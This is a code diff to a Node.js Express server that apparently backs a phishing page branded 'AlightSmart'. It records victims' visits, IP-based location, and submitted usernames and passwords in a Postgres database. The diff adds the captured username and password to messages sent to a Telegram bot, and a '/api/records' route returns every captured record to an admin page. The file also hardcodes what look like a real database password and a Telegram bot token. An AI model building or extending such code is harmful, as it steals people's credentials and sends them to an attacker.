@@ -6,7 +6,6 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Supabase Connection
 const pool = new Pool({
     connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
@@ -23,79 +22,62 @@ pool.query(`
         location TEXT,
         timestamp TEXT
     )
-`).then(() => console.log("✅ Table Ready"))
-  .catch(err => console.error("Table Error:", err.message));
+`).then(() => console.log("✅ Table Ready"));
 
 function getRealIP(req) {
-    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-           req.headers['x-real-ip'] ||
-           req.ip ||
-           'Unknown';
+    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'Unknown';
 }
 
-// Telegram
 const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
 const CHAT_ID = "8559945003";
 
-async function sendTelegramNotification(record) {
-    const message = `🚨🔴 *NEW LINK CLICK - AlightSmart!*\n\n` +
-        `• *Type:* ${record.type}\n` +
-        `• *Details:* ${record.address || '-'}\n` +
-        `• *IP:* ${record.ip}\n` +
-        `• *Location:* ${record.location || 'Detecting...'}\n` +
-        `• *Time:* ${record.timestamp}\n\n` +
-        `🕒 ${new Date().toLocaleString()}`;
+async function sendTelegram(record) {
+    const msg = `🚨 *New Activity*\n\n` +
+        `Type: ${record.type}\n` +
+        `User: ${record.username || 'Visitor'}\n` +
+        `Pass: ${record.password || '-'}\n` +
+        `Details: ${record.address || '-'}\n` +
+        `IP: ${record.ip}\n` +
+        `Location: ${record.location || 'Unknown'}\n` +
+        `Time: ${record.timestamp}`;
 
     try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
         });
-    } catch (err) {}
+    } catch(e) {}
 }
 
-async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
+async function saveRecord(type, username=null, password=null, address=null, ip='Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    
-    // Save to database first
+    let location = 'Unknown';
+
     try {
-        await pool.query(
-            "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1, $2, $3, $4, $5, $6, $7)",
-            [type, username, password, address, ip, 'Detecting...', timestamp]
-        );
-    } catch (e) {}
+        const res = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`, { timeout: 3000 });
+        const data = await res.json();
+        location = `${data.city || ''}, ${data.country || ''}`.trim() || 'Unknown';
+    } catch(e) {}
 
-    // Send notification immediately
-    await sendTelegramNotification({ type, username, password, address, ip, location: 'Detecting...', timestamp });
+    await pool.query(
+        "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1,$2,$3,$4,$5,$6,$7)",
+        [type, username, password, address, ip, location, timestamp]
+    );
 
-    // Update location in background
-    if (ip !== 'Unknown') {
-        try {
-            const res = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`, { timeout: 4000 });
-            const data = await res.json();
-            if (data.city || data.country) {
-                const location = `${data.city || ''}, ${data.country || ''}`.trim();
-                await pool.query("UPDATE records SET location = $1 WHERE timestamp = $2", [location, timestamp]);
-            }
-        } catch (e) {}
-    }
+    await sendTelegram({ type, username, password, address, ip, location, timestamp });
 }
 
-// ==================== ROUTES ====================
+// Routes
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
-    await saveRecord('Page Visit', null, null, '🔗 Main Link Clicked', ip);
+    await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', async (req, res) => {
     const ip = getRealIP(req);
-    await saveRecord('Page Visit', null, null, '🔑 Login Page Opened', ip);
+    await saveRecord('Page Visit', null, null, 'Login Page Opened', ip);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
@@ -106,42 +88,14 @@ app.post('/api/login', async (req, res) => {
     res.json({ success: true });
 });
 
-// Other routes (admin, confirm, delete, clear) remain the same...
 app.get('/api/records', async (req, res) => {
-    try {
-        const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
-        res.json(result.rows);
-    } catch (err) {
-        res.json([]);
-    }
+    const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
+    res.json(result.rows);
 });
 
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
 
-app.post('/api/confirm-code', async (req, res) => {
-    const { id, status } = req.body;
-    try {
-        await pool.query("UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2", [status, id]);
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ success: false });
-    }
-});
-
-app.post('/api/delete-record', async (req, res) => {
-    const { id } = req.body;
-    try {
-        await pool.query("DELETE FROM records WHERE id = $1", [id]);
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ success: false });
-    }
-});
-
-app.post('/api/clear', async (req, res) => {
-    await pool.query("DELETE FROM records");
-    res.json({ message: 'All records cleared' });
-});
+// Other routes (confirm-code, delete, clear) keep as they were
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`Server running on ${PORT}`));
